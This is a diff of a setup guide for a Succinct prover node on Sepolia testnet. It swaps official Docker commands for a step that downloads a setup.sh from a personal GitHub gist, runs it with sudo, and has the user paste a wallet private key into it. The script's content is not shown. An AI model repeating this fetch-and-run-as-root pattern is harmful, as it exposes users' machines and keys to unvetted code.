@@ -1,156 +1,89 @@
-# Step 1: Requirements
-You will need a fresh Ethereum wallet with some Sepolia ETH to interact with protocol smart contracts. We suggest using a fresh wallet for this purpose since the private key will be used inside the proving CLI
+# **Running a Succinct Prover Node on Sepolia**
 
+Welcome to the Succinct Prover Network node instructions! Here, you’ll find everything you’ll need to run a prover on the network. We’ve made it really simple for you to participate: all you have to do is stake testnet PROVE tokens and run a script.
 
-You will also need at least 1000 $PROVE tokens to stake to your prover. You can obtain these tokens through [FAUCET](https://docs.google.com/forms/d/e/1FAIpQLSfgTpBL_wMWyyoxT6LxuMhiu-bex0cBg9kRTmxoKw3XOluOCA/viewform)
+## **1. Setup your GPU**
 
-# Step 2: Create Your Prover
+Make sure your machine has these specs: 
 
-Create Your Prover GO THIS [LINK](https://staking.sepolia.succinct.xyz/prover) AND STAKE 1000 $PROVE TOKEN
+- **GPU:** NVIDIA RTX 3090 or 4090
+- **Memory: 24 GB RAM (required)**
+- **Disk: 100 GB (recommended)**
+- **CPU: 4 cores (required)**
+- **Template: Ubuntu VM (22.04/24.04) (required)**
 
-# Step 4: Calibrate the Prover
-The prover needs to be calibrated to your hardware in order to configure key parameters that govern its behavior. There are two key parameters that need to be set:
+You can rent a machine at any of these providers:
 
-Bidding Price: This is the price per proving gas unit (PGU) that the prover will bid for. This determines the profit margin of the prover and it's competitiveness with the rest of the network.
-Expected Throughput: This is an estimate of the prover's proving throughput in PGUs per second. This is used to estimate whether a prover can complete a proof before its deadline.
+- **Genesis Cloud:** ~$0.2/hr. Easy setup. Username: ubuntu. Password given during checkout. https://www.genesiscloud.com/pricing
+- **TensorDock:** RTX 3090/4090. https://dashboard.tensordock.com/deploy
+- **Vast.ai:** https://cloud.vast.ai/?gpu_option=RTX%203090
 
+## **2. Get $PROVE on Ethereum Sepolia**
 
-# 🧠 Succinct Prover Node Setup (WSL2 + Docker + GPU Ready)
+Fill out this [form](https://docs.google.com/forms/d/e/1FAIpQLSfgTpBL_wMWyyoxT6LxuMhiu-bex0cBg9kRTmxoKw3XOluOCA/viewform) to get testnet $PROVE tokens. You will also need some Sepolia ETH. 
 
-Run a Succinct Prover Node on a **Windows PC** with **WSL2 + Ubuntu**, **Docker**, and **RTX 4060 (GPU)** support.
+**For security, please create a fresh wallet specifically for this prover, as the private key will be used directly in the CLI**. We’ll transfer **1000 testnet PROVE** tokens to your wallet address on Sepolia along with some Sepolia ETH ****for gas. You’ll stake this PROVE to your prover to begin generating proofs.
 
----
+## **3. Setup Your Prover**
 
-## 📦 Requirements
+Your prover requires stake in order to begin generating proofs; this stake provides economic security to your prover. To set up your prover, follow these steps:
 
-- Windows 10/11
-- WSL2 + Ubuntu
-- Docker
-- NVIDIA GPU (optional, for proving acceleration)
-- Testnet $PROVE tokens (optional for bidding)
+- **Create a prover at** https://staking.sepolia.succinct.xyz/prover
+- Stake **1,000 testnet $PROVE** to your **own prover** (not someone else’s) at https://staking.sepolia.succinct.xyz/prover
 
----
+After creating your prover and staking to it, copy your **PROVER_ADDRESS**, which can be found under “My Prover” on the Prover tab. Also copy the **PRIVATE_KEY** of the fresh Sepolia address you created.
 
-## 🚀 1. Install WSL2 + Ubuntu
+## **4. Install the Prover Node Software**
 
-Open PowerShell as Admin:
+These commands download the prover node software. Run them in your terminal.
 
-```
-powershell
-wsl --install
-```
-Restart your PC.
-
-2. Download Docker Desktop
-Go to: [LINK](https://www.docker.com/products/docker-desktop/)
-
-Click Download for Windows and install it.
-
-## 3. Enable WSL2 Integration
-After installation:
-
-Open Docker Desktop
-
-Go to Settings > General
-
-Ensure "Use WSL 2 instead of Hyper-V" is checked
-
-Go to Settings > Resources > WSL Integration and enable for your distro (e.g., Ubuntu)
-
-
-## 4. (Optional) Enable GPU Support
-If you want to run GPU containers:
-
-✅ Make sure:
-
-You have NVIDIA driver + CUDA installed
-
-You install NVIDIA Container Toolkit inside WSL2 Ubuntu
-
-In WSL2 Ubuntu terminal:
-```
-sudo apt update && sudo apt install -y nvidia-container-toolkit
-sudo systemctl restart docker
+```bash
+wget -O setup.sh https://gist.githubusercontent.com/0xCRASHOUT/6656b9418018c3657e612c34ae1546fd/raw/setup.sh
 ```
 
-## 5. Test Docker
-In a terminal (Command Prompt, PowerShell, or Ubuntu):
-```
-docker --version
-docker run hello-world
-```
+## **5. Run your Prover**
 
-
-## If you installed with Docker, you can run the following command:
+Before running your prover, make sure you’re in a `tmux` session to keep your prover running in the background (certain GPU setups come pre-installed with `tmux`  running; monitor your terminal to see whether you’re in one). 
 
 ```
-docker run --rm public.ecr.aws/succinct-labs/spn-node:latest-gpu calibrate \
-    --usd-cost-per-hour 0.80 \
-    --utilization-rate 0.5 \
-    --profit-margin 0.1 \
-    --prove-price 1.00
+sudo apt update && sudo apt install -y tmux
+
+tmux new -s prover
 ```
 
-**This will output calibration results that look like the following:**
+To start your prover, run this command:
 
-### Parameters
-
-| Parameter        | Value  |
-|------------------|--------|
-| Cost Per Hour    | $0.80  |
-| Utilization Rate | 50.00% |
-| Profit Margin    | 10.00% |
-| Price of $PROVE  | $1.00  |
-
-
-
-Starting calibration...
-
-### Calibration Results
-
-| Metric               | Value                   |
-|----------------------|-------------------------|
-| Estimated Throughput | 1742469 PGUs/second     |
-| Estimated Bid Price  | 0.28 $PROVE per 1B PGUs |
-
-
-**This tells you that your prover can prove 1742469 prover gas units (PGUs) per second and that you should bid 0.28 $PROVE per 1B PGUs for proofs.**
-
-## Set these parameters as environment variables for later use:
-
-```
-export PGUS_PER_SECOND=<PGUS_PER_SECOND>
-export PROVE_PER_BPGU=<PROVE_PER_BPGU>
-export PROVER_ADDRESS=<PROVER_ADDRESS>
-export PRIVATE_KEY=<PRIVATE_KEY>
+```bash
+sudo bash setup.sh
 ```
 
-## Step 5: Run the Prover
-At this point, we've done all the necessary setup. If you installed with Docker, you can run the following command:
+**After the reboot, rerun** `sudo bash setup.sh`.
 
-```
-docker run --rm public.ecr.aws/succinct-labs/spn-node:latest-gpu prove \
-    --rpc-url https://rpc-production.succinct.xyz \
-    --throughput $PGUS_PER_SECOND \
-    --bid $PROVE_PER_BPGU \
-    --private-key $PRIVATE_KEY \
-    --prover $PROVER_ADDRESS
-```
-**EXAMPLE**
-```
-docker run --rm public.ecr.aws/succinct-labs/spn-node:latest-gpu prove \
-    --rpc-url https://rpc-production.succinct.xyz \
-    --throughput 1742469 \
-    --bid 0.28 \
-    --private-key YOUR  WALLET PRIVATEKEY \
-    --prover YOUR ADDRESS 
-```
+After successful setup, it will ask you to “Enter Prover Address”. Paste the **PROVER_ADDRESS** value you copied above. Next, it will ask you to “Enter Private Key”. Paste the **PRIVATE_KEY** value you got from above.
 
+**Your prover will now start running and bidding for proofs in the network!** You can monitor your proofs in the Prover dashboard.
 
-## DODE YOUR PROVER NODE RUNING
+## **6. Share on X/Twitter**
 
-**What hardware is recommended for running a prover?**
-The minimal implementation works on standard consumer hardware, but competitive provers typically use optimized setups with powerful GPUs. As a reminder, most competitive provers use high-end GPUs like NVIDIA 4090s and orchestrate their own proving software to maximize throughput.
+Let the world know you're running a prover on the Succinct Network!
+
+Post a photo or screenshot of your screen taken from your phone (bonus points if it shows your setup, location, or terminal running).
+
+## **FAQs & Troubleshooting**
+
+**How can I check if my proofs are successful?**
+
+Your Prover dashboard shows the proofs you won and the testnet balance you’ve accrued.
+
+**How can I change my node’s parameters?**
+
+The script that generates proofs currently sets default parameters that we recommend. If you want to change these parameters, you can modify PROVE_PER_BPGU, the bid price, and PGUS_PER_SECOND, the maximum throughput of the prover, in script.sh.
+
+**Common Errors**
+
+- **Permanent error when Bid: request is not in the requested state**: This is normal. You lost a proof contest and the node will retry for another proof.
+- **Permanent error when Bid: you do not have rights to bid**: You need to stake 1000 testnet $PROVE or you copied the incorrect PROVER_ADDRESS. Make sure you copied the address underneath “My Prover”.
+- **Permanent error when Bid: you need to stake at least 1000 PROVE**: You need to stake 1,000 testnet $PROVE. Once staked, rerun sudo bash [setup.sh](http://setup.sh/).
 
 
 
